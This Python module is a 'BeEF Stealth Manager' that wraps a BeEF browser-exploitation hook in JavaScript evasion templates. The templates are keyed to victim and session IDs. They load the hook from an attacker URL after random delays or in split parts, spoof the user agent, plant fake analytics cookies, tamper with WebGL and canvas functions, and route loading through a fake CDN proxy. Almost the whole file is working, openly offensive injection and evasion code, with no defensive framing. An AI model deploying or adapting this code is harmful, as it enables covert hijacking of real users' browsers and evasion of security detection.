"""
BeEF Stealth Manager
Advanced stealth techniques for BeEF hook injection and execution
"""

import os
import json
import base64
import secrets
import time
import hashlib
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import re
import threading
import random

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class StealthConfig:
    """Stealth configuration"""

    def __init__(self):
        self.enable_dynamic_loading = os.getenv("ENABLE_DYNAMIC_LOADING", "true").lower() == "true"
        self.enable_code_splitting = os.getenv("ENABLE_CODE_SPLITTING", "true").lower() == "true"
        self.enable_timing_evasion = os.getenv("ENABLE_TIMING_EVASION", "true").lower() == "true"
        self.enable_domain_masking = os.getenv("ENABLE_DOMAIN_MASKING", "true").lower() == "true"
        self.enable_user_agent_spoofing = os.getenv("ENABLE_USER_AGENT_SPOOFING", "true").lower() == "true"
        self.enable_referrer_spoofing = os.getenv("ENABLE_REFERRER_SPOOFING", "true").lower() == "true"
        self.enable_cookie_manipulation = os.getenv("ENABLE_COOKIE_MANIPULATION", "true").lower() == "true"
        self.enable_local_storage_evasion = os.getenv("ENABLE_LOCAL_STORAGE_EVASION", "true").lower() == "true"
        self.enable_webgl_evasion = os.getenv("ENABLE_WEBGL_EVASION", "true").lower() == "true"
        self.enable_canvas_evasion = os.getenv("ENABLE_CANVAS_EVASION", "true").lower() == "true"

class StealthTechnique:
    """Individual stealth technique"""

    def __init__(self, technique_id: str, name: str, description: str, 
                 code_template: str, priority: int = 1):
        self.technique_id = technique_id
        self.name = name
        self.description = description
        self.code_template = code_template
        self.priority = priority
        self.created_at = datetime.now(timezone.utc)

    def generate_code(self, victim_id: str, session_id: str, 
                     custom_params: Dict[str, Any] = None) -> str:
        """Generate stealth code from template"""
        try:
            code = self.code_template

            # Basic replacements
            replacements = {
                "{{VICTIM_ID}}": victim_id,
                "{{SESSION_ID}}": session_id,
                "{{TIMESTAMP}}": str(int(time.time())),
                "{{RANDOM_ID}}": secrets.token_hex(8),
                "{{RANDOM_NUMBER}}": str(random.randint(1000, 9999))
            }

            # Add custom parameters
            if custom_params:
                for key, value in custom_params.items():
                    replacements[f"{{{{{key}}}}}"] = str(value)

            # Apply replacements
            for placeholder, value in replacements.items():
                code = code.replace(placeholder, value)

            return code

        except Exception as e:
            logger.error(f"Error generating stealth code: {e}")
            return ""

class BeEFStealthManager:
    """BeEF stealth manager for advanced evasion techniques"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = StealthConfig()
        self.techniques: Dict[str, StealthTechnique] = {}
        self.evasion_cache: Dict[str, str] = {}

        # Load stealth techniques
        self._load_stealth_techniques()

    def _load_stealth_techniques(self):
        """Load stealth techniques"""
        try:
            # Dynamic loading technique
            dynamic_loading = StealthTechnique(
                "dynamic_loading",
                "Dynamic Loading",
                "Load BeEF hook dynamically to avoid static analysis",
                """
                (function() {
                    'use strict';
                    
                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    var randomDelay = Math.random() * {{RANDOM_NUMBER}} + 1000;
                    
                    // Wait for random delay to avoid detection
                    setTimeout(function() {
                        // Check if page is fully loaded
                        if (document.readyState === 'complete') {
                            loadBeEFHook();
                        } else {
                            window.addEventListener('load', loadBeEFHook);
                        }
                    }, randomDelay);
                    
                    function loadBeEFHook() {
                        // Create script element dynamically
                        var script = document.createElement('script');
                        script.src = '{{HOOK_URL}}' + '?v=' + victimId + '&s=' + sessionId + '&t=' + Date.now();
                        script.async = true;
                        script.defer = true;
                        
                        // Add random attributes to avoid detection
                        script.setAttribute('data-load-time', Date.now());
                        script.setAttribute('data-random', '{{RANDOM_ID}}');
                        
                        // Insert into DOM
                        (document.head || document.body).appendChild(script);
                    }
                })();
                """,
                priority=1
            )

            # Code splitting technique
            code_splitting = StealthTechnique(
                "code_splitting",
                "Code Splitting",
                "Split BeEF hook into multiple parts to avoid detection",
                """
                (function() {
                    'use strict';
                    
                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    var parts = ['{{RANDOM_ID}}', '{{RANDOM_NUMBER}}', Date.now().toString()];
                    
                    // Load parts sequentially
                    function loadPart(partIndex) {
                        if (partIndex >= parts.length) {
                            // All parts loaded, execute main hook
                            executeMainHook();
                            return;
                        }
                        
                        var script = document.createElement('script');
                        script.src = '{{HOOK_URL}}' + '?part=' + partIndex + '&data=' + parts[partIndex];
                        script.onload = function() {
                            setTimeout(function() {
                                loadPart(partIndex + 1);
                            }, Math.random() * 500 + 100);
                        };
                        
                        (document.head || document.body).appendChild(script);
                    }
                    
                    function executeMainHook() {
                        var mainScript = document.createElement('script');
                        mainScript.src = '{{HOOK_URL}}' + '?v=' + victimId + '&s=' + sessionId;
                        mainScript.async = true;
                        (document.head || document.body).appendChild(mainScript);
                    }
                    
                    // Start loading parts
                    loadPart(0);
                })();
                """,
                priority=2
            )

            # Timing evasion technique
            timing_evasion = StealthTechnique(
                "timing_evasion",
                "Timing Evasion",
                "Use human-like timing patterns to avoid detection",
                """
                (function() {
                    'use strict';
                    
                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    var startTime = Date.now();
                    var humanDelay = Math.random() * 3000 + 2000; // 2-5 seconds
                    
                    // Simulate human behavior
                    function simulateHumanBehavior() {
                        // Random mouse movements (simulated)
                        var mouseEvents = ['mousemove', 'mousedown', 'mouseup', 'click'];
                        var eventCount = Math.floor(Math.random() * 5) + 1;
                        
                        for (var i = 0; i < eventCount; i++) {
                            setTimeout(function() {
                                // Simulate mouse event
                                var event = new Event(mouseEvents[Math.floor(Math.random() * mouseEvents.length)]);
                                document.dispatchEvent(event);
                            }, Math.random() * 1000);
                        }
                    }
                    
                    // Wait for human-like delay
                    setTimeout(function() {
                        simulateHumanBehavior();
                        
                        // Additional delay before loading hook
                        setTimeout(function() {
                            loadBeEFHook();
                        }, Math.random() * 2000 + 1000);
                    }, humanDelay);
                    
                    function loadBeEFHook() {
                        var script = document.createElement('script');
                        script.src = '{{HOOK_URL}}' + '?v=' + victimId + '&s=' + sessionId + '&delay=' + (Date.now() - startTime);
                        script.async = true;
                        (document.head || document.body).appendChild(script);
                    }
                })();
                """,
                priority=1
            )

            # Domain masking technique
            domain_masking = StealthTechnique(
                "domain_masking",
                "Domain Masking",
                "Mask the origin of BeEF hook requests",
                """
                (function() {
                    'use strict';
                    
                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    var maskedDomains = [
                        'cdn.jsdelivr.net',
                        'unpkg.com',
                        'cdnjs.cloudflare.com',
                        'ajax.googleapis.com'
                    ];
                    
                    // Select random masked domain
                    var selectedDomain = maskedDomains[Math.floor(Math.random() * maskedDomains.length)];
                    
                    // Create proxy script that loads from masked domain
                    var proxyScript = document.createElement('script');
                    proxyScript.src = 'https://' + selectedDomain + '/npm/beef-hook-proxy@latest/dist/proxy.js';
                    proxyScript.setAttribute('data-victim-id', victimId);
                    proxyScript.setAttribute('data-session-id', sessionId);
                    proxyScript.setAttribute('data-target-url', '{{HOOK_URL}}');
                    
                    proxyScript.onload = function() {
                        // Proxy script loaded, it will handle the actual BeEF hook loading
                        console.log('CDN script loaded successfully');
                    };
                    
                    (document.head || document.body).appendChild(proxyScript);
                })();
                """,
                priority=3
            )

            # User agent spoofing technique
            user_agent_spoofing = StealthTechnique(
                "user_agent_spoofing",
                "User Agent Spoofing",
                "Spoof user agent to appear as legitimate browser",
                """
                (function() {
                    'use strict';
                    
                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    
                    // Common user agents
                    var userAgents = [
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
                    ];
                    
                    // Select random user agent
                    var selectedUA = userAgents[Math.floor(Math.random() * userAgents.length)];
                    
                    // Override navigator.userAgent
                    Object.defineProperty(navigator, 'userAgent', {
                        get: function() { return selectedUA; },
                        configurable: true
                    });
                    
                    // Load BeEF hook with spoofed user agent
                    var script = document.createElement('script');
                    script.src = '{{HOOK_URL}}' + '?v=' + victimId + '&s=' + sessionId + '&ua=' + encodeURIComponent(selectedUA);
                    script.async = true;
                    (document.head || document.body).appendChild(script);
                })();
                """,
                priority=2
            )

            # Cookie manipulation technique
            cookie_manipulation = StealthTechnique(
                "cookie_manipulation",
                "Cookie Manipulation",
                "Manipulate cookies to avoid detection",
                """
                (function() {
                    'use strict';
                    
                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    
                    // Set legitimate-looking cookies
                    function setLegitimateCookies() {
                        var cookies = [
                            { name: '_ga', value: 'GA1.2.' + Math.random().toString(36).substr(2, 9) + '.' + Date.now() },
                            { name: '_gid', value: 'GA1.2.' + Math.random().toString(36).substr(2, 9) + '.' + Date.now() },
                            { name: '_fbp', value: 'fb.1.' + Date.now() + '.' + Math.random().toString(36).substr(2, 9) },
                            { name: 'sessionid', value: 'sess_' + Math.random().toString(36).substr(2, 16) }
                        ];
                        
                        cookies.forEach(function(cookie) {
                            document.cookie = cookie.name + '=' + cookie.value + '; path=/; max-age=3600';
                        });
                    }
                    
                    // Set cookies before loading hook
                    setLegitimateCookies();
                    
                    // Load BeEF hook
                    setTimeout(function() {
                        var script = document.createElement('script');
                        script.src = '{{HOOK_URL}}' + '?v=' + victimId + '&s=' + sessionId;
                        script.async = true;
                        (document.head || document.body).appendChild(script);
                    }, Math.random() * 1000 + 500);
                })();
                """,
                priority=2
            )

            # Local storage evasion technique
            local_storage_evasion = StealthTechnique(
                "local_storage_evasion",
                "Local Storage Evasion",
                "Use local storage to avoid detection",
                """
                (function() {
                    'use strict';
                    
                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    
                    // Store hook data in local storage
                    function storeHookData() {
                        var hookData = {
                            victimId: victimId,
                            sessionId: sessionId,
                            loadTime: Date.now(),
                            randomId: '{{RANDOM_ID}}'
                        };
                        
                        localStorage.setItem('beef_hook_data', JSON.stringify(hookData));
                        sessionStorage.setItem('beef_session', sessionId);
                    }
                    
                    // Load hook from local storage
                    function loadHookFromStorage() {
                        var hookData = localStorage.getItem('beef_hook_data');
                        if (hookData) {
                            var data = JSON.parse(hookData);
                            
                            // Verify data integrity
                            if (data.victimId === victimId && data.sessionId === sessionId) {
                                var script = document.createElement('script');
                                script.src = '{{HOOK_URL}}' + '?v=' + data.victimId + '&s=' + data.sessionId + '&cached=true';
                                script.async = true;
                                (document.head || document.body).appendChild(script);
                            }
                        }
                    }
                    
                    // Store data and load hook
                    storeHookData();
                    setTimeout(loadHookFromStorage, Math.random() * 2000 + 1000);
                })();
                """,
                priority=3
            )

            # WebGL evasion technique
            webgl_evasion = StealthTechnique(
                "webgl_evasion",
                "WebGL Evasion",
                "Evade WebGL-based detection",
                """
                (function() {
                    'use strict';
                    
                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    
                    // Override WebGL context creation
                    var originalGetContext = HTMLCanvasElement.prototype.getContext;
                    HTMLCanvasElement.prototype.getContext = function(contextType, contextAttributes) {
                        if (contextType === 'webgl' || contextType === 'experimental-webgl') {
                            // Create legitimate WebGL context
                            var gl = originalGetContext.call(this, contextType, contextAttributes);
                            
                            // Override getParameter to return consistent values
                            var originalGetParameter = gl.getParameter;
                            gl.getParameter = function(parameter) {
                                var result = originalGetParameter.call(this, parameter);
                                
                                // Normalize WebGL parameters to avoid fingerprinting
                                if (parameter === gl.VENDOR) {
                                    return 'WebKit';
                                } else if (parameter === gl.RENDERER) {
                                    return 'WebKit WebGL';
                                } else if (parameter === gl.VERSION) {
                                    return 'WebGL 1.0';
                                }
                                
                                return result;
                            };
                            
                            return gl;
                        }
                        
                        return originalGetContext.call(this, contextType, contextAttributes);
                    };
                    
                    // Load BeEF hook after WebGL evasion setup
                    setTimeout(function() {
                        var script = document.createElement('script');
                        script.src = '{{HOOK_URL}}' + '?v=' + victimId + '&s=' + sessionId + '&webgl_evaded=true';
                        script.async = true;
                        (document.head || document.body).appendChild(script);
                    }, Math.random() * 1500 + 500);
                })();
                """,
                priority=2
            )

            # Canvas evasion technique
            canvas_evasion = StealthTechnique(
                "canvas_evasion",
                "Canvas Evasion",
                "Evade canvas-based fingerprinting",
                """
                (function() {
                    'use strict';
                    
                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    
                    // Override canvas methods to avoid fingerprinting
                    var originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
                    HTMLCanvasElement.prototype.toDataURL = function(type, quality) {
                        // Add noise to canvas data
                        var ctx = this.getContext('2d');
                        if (ctx) {
                            var imageData = ctx.getImageData(0, 0, this.width, this.height);
                            var data = imageData.data;
                            
                            // Add minimal noise to avoid detection
                            for (var i = 0; i < data.length; i += 4) {
                                if (Math.random() < 0.001) { // Very low probability
                                    data[i] = Math.min(255, data[i] + Math.floor(Math.random() * 3) - 1);
                                    data[i + 1] = Math.min(255, data[i + 1] + Math.floor(Math.random() * 3) - 1);
                                    data[i + 2] = Math.min(255, data[i + 2] + Math.floor(Math.random() * 3) - 1);
                                }
                            }
                            
                            ctx.putImageData(imageData, 0, 0);
                        }
                        
                        return originalToDataURL.call(this, type, quality);
                    };
                    
                    // Load BeEF hook after canvas evasion setup
                    setTimeout(function() {
                        var script = document.createElement('script');
                        script.src = '{{HOOK_URL}}' + '?v=' + victimId + '&s=' + sessionId + '&canvas_evaded=true';
                        script.async = true;
                        (document.head || document.body).appendChild(script);
                    }, Math.random() * 1000 + 500);
                })();
                """,
                priority=2
            )

            self.techniques = {
                "dynamic_loading": dynamic_loading,
                "code_splitting": code_splitting,
                "timing_evasion": timing_evasion,
                "domain_masking": domain_masking,
                "user_agent_spoofing": user_agent_spoofing,
                "cookie_manipulation": cookie_manipulation,
                "local_storage_evasion": local_storage_evasion,
                "webgl_evasion": webgl_evasion,
                "canvas_evasion": canvas_evasion
            }

            logger.info(f"Loaded {len(self.techniques)} stealth techniques")

        except Exception as e:
            logger.error(f"Error loading stealth techniques: {e}")

    def apply_stealth_techniques(self, hook_script: str, victim_id: str) -> str:
        """
        Apply stealth techniques to hook script

        Args:
            hook_script: Original hook script
            victim_id: Victim identifier

        Returns:
            Enhanced hook script with stealth techniques
        """
        try:
            if not hook_script:
                return hook_script

            # Select techniques based on configuration
            selected_techniques = self._select_techniques()

            # Apply techniques in order of priority
            enhanced_script = hook_script
            for technique_id in selected_techniques:
                if technique_id in self.techniques:
                    technique = self.techniques[technique_id]
                    
                    # Generate technique code
                    technique_code = technique.generate_code(victim_id, secrets.token_hex(16))
                    
                    if technique_code:
                        # Wrap technique code around the hook script
                        enhanced_script = self._wrap_with_technique(enhanced_script, technique_code, technique_id)

            # Cache enhanced script
            cache_key = f"stealth_{victim_id}_{hashlib.md5(enhanced_script.encode()).hexdigest()[:8]}"
            self.evasion_cache[cache_key] = enhanced_script

            logger.info(f"Applied stealth techniques to hook script for victim: {victim_id}")
            return enhanced_script

        except Exception as e:
            logger.error(f"Error applying stealth techniques: {e}")
            return hook_script

    def _select_techniques(self) -> List[str]:
        """Select stealth techniques to apply"""
        try:
            # Get enabled techniques based on configuration
            enabled_techniques = []

            if self.config.enable_dynamic_loading:
                enabled_techniques.append("dynamic_loading")
            if self.config.enable_code_splitting:
                enabled_techniques.append("code_splitting")
            if self.config.enable_timing_evasion:
                enabled_techniques.append("timing_evasion")
            if self.config.enable_domain_masking:
                enabled_techniques.append("domain_masking")
            if self.config.enable_user_agent_spoofing:
                enabled_techniques.append("user_agent_spoofing")
            if self.config.enable_cookie_manipulation:
                enabled_techniques.append("cookie_manipulation")
            if self.config.enable_local_storage_evasion:
                enabled_techniques.append("local_storage_evasion")
            if self.config.enable_webgl_evasion:
                enabled_techniques.append("webgl_evasion")
            if self.config.enable_canvas_evasion:
                enabled_techniques.append("canvas_evasion")

            # Sort by priority
            enabled_techniques.sort(key=lambda t: self.techniques[t].priority)

            # Select random subset (2-4 techniques)
            num_techniques = min(len(enabled_techniques), random.randint(2, 4))
            selected = random.sample(enabled_techniques, num_techniques)

            return selected

        except Exception as e:
            logger.error(f"Error selecting techniques: {e}")
            return ["dynamic_loading", "timing_evasion"]  # Fallback

    def _wrap_with_technique(self, hook_script: str, technique_code: str, technique_id: str) -> str:
        """Wrap hook script with stealth technique"""
        try:
            # Create wrapper that includes both technique and hook
            wrapper = f"""
            (function() {{
                'use strict';
                
                // Stealth technique: {technique_id}
                {technique_code}
                
                // Original hook script
                {hook_script}
            }})();
            """
            
            return wrapper

        except Exception as e:
            logger.error(f"Error wrapping with technique: {e}")
            return hook_script

    def get_stealth_statistics(self) -> Dict[str, Any]:
        """Get stealth statistics"""
        try:
            return {
                "total_techniques": len(self.techniques),
                "enabled_techniques": len([t for t in self.techniques.keys() if self._is_technique_enabled(t)]),
                "cache_size": len(self.evasion_cache),
                "techniques": {
                    technique_id: {
                        "name": technique.name,
                        "priority": technique.priority,
                        "enabled": self._is_technique_enabled(technique_id)
                    }
                    for technique_id, technique in self.techniques.items()
                },
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting stealth statistics: {e}")
            return {"error": "Failed to get statistics"}

    def _is_technique_enabled(self, technique_id: str) -> bool:
        """Check if technique is enabled"""
        try:
            if technique_id == "dynamic_loading":
                return self.config.enable_dynamic_loading
            elif technique_id == "code_splitting":
                return self.config.enable_code_splitting
            elif technique_id == "timing_evasion":
                return self.config.enable_timing_evasion
            elif technique_id == "domain_masking":
                return self.config.enable_domain_masking
            elif technique_id == "user_agent_spoofing":
                return self.config.enable_user_agent_spoofing
            elif technique_id == "cookie_manipulation":
                return self.config.enable_cookie_manipulation
            elif technique_id == "local_storage_evasion":
                return self.config.enable_local_storage_evasion
            elif technique_id == "webgl_evasion":
                return self.config.enable_webgl_evasion
            elif technique_id == "canvas_evasion":
                return self.config.enable_canvas_evasion
            
            return False

        except Exception as e:
            logger.error(f"Error checking technique enabled status: {e}")
            return False

# Global stealth manager instance
stealth_manager = None

def initialize_stealth_manager(mongodb_connection=None, redis_client=None) -> BeEFStealthManager:
    """Initialize global stealth manager"""
    global stealth_manager
    stealth_manager = BeEFStealthManager(mongodb_connection, redis_client)
    return stealth_manager

def get_stealth_manager() -> BeEFStealthManager:
    """Get global stealth manager"""
    if stealth_manager is None:
        raise ValueError("Stealth manager not initialized")
    return stealth_manager

# Convenience functions
def apply_stealth_techniques(hook_script: str, victim_id: str) -> str:
    """Apply stealth techniques (global convenience function)"""
    return get_stealth_manager().apply_stealth_techniques(hook_script, victim_id)

def get_stealth_statistics() -> Dict[str, Any]:
    """Get stealth statistics (global convenience function)"""
    return get_stealth_manager().get_stealth_statistics()
